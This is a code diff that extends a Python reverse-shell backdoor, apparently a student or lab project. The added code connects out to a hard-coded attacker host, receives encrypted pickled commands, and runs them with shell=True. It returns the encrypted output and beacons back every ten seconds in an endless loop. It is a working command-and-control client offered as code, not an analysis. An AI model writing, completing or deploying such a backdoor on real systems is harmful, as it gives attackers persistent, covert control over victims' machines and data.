@@ -32,6 +32,14 @@ import subprocess
 import os
 import json
 import random
+import pickle
+import time
+
+symm_key = None
+cwd = None
+
+STATUS_SUCCESS = 1
+STATUS_ERROR = 0
 
 def convert_path(file_name):
     script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -80,27 +88,40 @@ def read_key(key_fpath):
         symm_key = bytes.fromhex(hex_key)
     return symm_key
 
-def get_encrypted_msg(symmetric_key, msg: str):
+def get_encrypted_msg(symmetric_key, msg, bytes=False):
     aesgcm = AESGCM(symmetric_key)
     nonce = os.urandom(12)
-    msg_bytes = msg.encode()
+    if bytes:
+        msg_bytes = msg
+    else: # string
+        msg_bytes = msg.encode()
     ct = aesgcm.encrypt(nonce=nonce, 
                         data=msg_bytes,
                         associated_data=None)
     return nonce + ct
 
-def decrypt_ct(symmetric_key, msg_ct):
-    # we are given nonce + ct
-    nonce_length = 12
-    nonce = msg_ct[:nonce_length]
-    ct = msg_ct[nonce_length:]
-    # decrypt
-    aesgcm = AESGCM(symmetric_key)
-    dec_msg_bytes = aesgcm.decrypt(nonce=nonce,
-                data=ct,
-                associated_data=None)
-    dec_msg = dec_msg_bytes.decode()
-    return dec_msg
+# returns status: enum, decrypted_ct: string | bytes
+def decrypt_ct(symmetric_key, msg_ct, bytes=False):
+    status = STATUS_SUCCESS
+    out_msg = "ERROR"
+    try:
+        # we are given nonce + ct
+        nonce_length = 12
+        nonce = msg_ct[:nonce_length]
+        ct = msg_ct[nonce_length:]
+        # decrypt
+        aesgcm = AESGCM(symmetric_key)
+        dec_msg_bytes = aesgcm.decrypt(nonce=nonce,
+                    data=ct,
+                    associated_data=None)
+        out_msg = dec_msg_bytes
+        if not bytes: # output string
+            out_msg = dec_msg_bytes.decode()
+    except Exception as e:
+        status = STATUS_ERROR
+        out_msg = f"Error: Received bad message. Sender likely has incorrect key!"
+
+    return status, out_msg
 
 def send_msg(connection, out_bytes):
     # first send message length
@@ -136,16 +157,47 @@ def run_shell_script(script_fname):
     try: 
         # result = subprocess.run(["bash", script_fname], capture_output=True, text=True)
         # return result.stdout + result.stderr
+
         # For Python 3.6 compatibility
-        result = subprocess.run(
-            ["bash", script_fname],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            universal_newlines=True  # This is equivalent to text=True
-        )
-        return result.stdout + result.stderr
+        # result = subprocess.run(
+        #     ["bash", script_fname],
+        #     stdout=subprocess.PIPE,
+        #     stderr=subprocess.PIPE,
+        #     universal_newlines=True  # This is equivalent to text=True
+        # )
+        # return result.stdout + result.stderr
+
+        with open(script_fname, 'r') as file:
+            commands = file.read().splitlines()[1:] # ignore 1st line
+            outputs = []
+            for command in commands:
+                print(f"c: {command}")
+                output = run_line(command)
+                print(f"o: {output}")
+                outputs.append(output)
+        return "".join(outputs)
     except Exception as e:
         return str(e)
+    
+def run_line(command):
+    if command.startswith("#"):
+        return "" # comment has no output
+    
+    global cwd
+    output = f"error running command:\n\t{command}\n"
+    # Run a command and capture the output
+    if command.startswith("cd "):
+        new_dir = command[3:].strip()
+        try:
+            os.chdir(new_dir)
+            cwd = os.getcwd() # update cwd
+            output = "" # successfully changed dir (no output)
+        except Exception as e:
+            output = f"cannot change directory to {new_dir}\n"
+    else:
+        result = subprocess.run(command, shell=True, cwd=cwd, capture_output=True, text=True)
+        output = (result.stdout + result.stderr) # .rstrip("\n")
+    return output
 
 def execute_msg(message):
     # TODO: complete so runs the code
@@ -171,6 +223,16 @@ def run_backdoor(ip, port):
     # connect to server (attack machine)
     client_socket.connect((host, port))
 
+    # send the current working directory
+    send_msg(
+        connection=client_socket,
+        out_bytes=get_encrypted_msg(
+            symmetric_key=symm_key,
+            msg=os.getcwd(),
+            bytes=False
+        )
+    )
+
     # receive message from server
     in_ct = receive_msg(
         connection=client_socket,
@@ -178,17 +240,31 @@ def run_backdoor(ip, port):
     )
 
     # decrypt message
-    symm_key = read_key(convert_path("key.txt"))
-    message = decrypt_ct(symmetric_key=symm_key,
-               msg_ct=in_ct)
-
+    status, message_bytes = decrypt_ct(symmetric_key=symm_key,
+               msg_ct=in_ct,
+               bytes=True)
+    if status == STATUS_ERROR:
+        # error message
+        print(message_bytes)
+        # stop early
+        return 
+    
+    global cwd
+    cwd, commands = pickle.loads(message_bytes)
+    print(f"in_cwd: {cwd}")
+    # set cwd before running code
+    os.chdir(cwd)
     # run code from message
-    script_output = execute_msg(message)
+    script_output = execute_msg(commands)
     print(f"output:\n{script_output}")
+    # are there updates to cwd?
+    print(f"out_cwd: {cwd}")
+    message = pickle.dumps((cwd, script_output))
     # send back output from executing code
     enc_output = get_encrypted_msg(
         symmetric_key=symm_key,
-        msg=script_output
+        msg=message,
+        bytes=True
     )
     # send output to server
     send_msg(
@@ -200,4 +276,9 @@ def run_backdoor(ip, port):
     client_socket.close()
 
 if __name__ == '__main__':
-    run_backdoor(REACH_IP, REACH_PORT)
+    symm_key = read_key(convert_path("key.txt"))
+    while(True):
+        # reach out to server
+        run_backdoor(REACH_IP, REACH_PORT)
+        # sleep for 10 sec
+        time.sleep(10)
